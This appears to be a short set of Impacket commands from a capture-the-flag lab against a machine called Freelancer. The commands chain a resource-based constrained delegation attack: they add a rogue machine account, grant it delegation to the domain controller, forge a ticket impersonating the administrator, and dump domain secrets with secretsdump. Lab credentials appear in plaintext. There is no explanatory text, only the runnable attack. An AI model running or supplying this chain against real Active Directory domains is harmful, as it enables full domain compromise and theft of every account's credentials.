    addcomputer.py -computer-name 'atacker$' -computer-pass 'P@ssword2025' -dc-host 10.10.11.5  'FREELANCER.HTB/lorra199:PWN3D#l0rr@Armessa199'

    rbcd.py -delegate-from 'atacker$' -delegate-to 'DC$' -action 'write' 'FREELANCER.HTB/lorra199:PWN3D#l0rr@Armessa199'                       

    getST.py -spn 'cifs/DC.FREELANCER.HTB' -impersonate 'administrator' 'FREELANCER.HTB/atacker$:P@ssword2025'

    KRB5CCNAME=administrator@cifs_DC.FREELANCER.HTB@FREELANCER.HTB.ccache secretsdump.py -k -no-pass -dc-ip 10.10.11.5 freelancer.htb/Administrator@dc.freelancer.htb

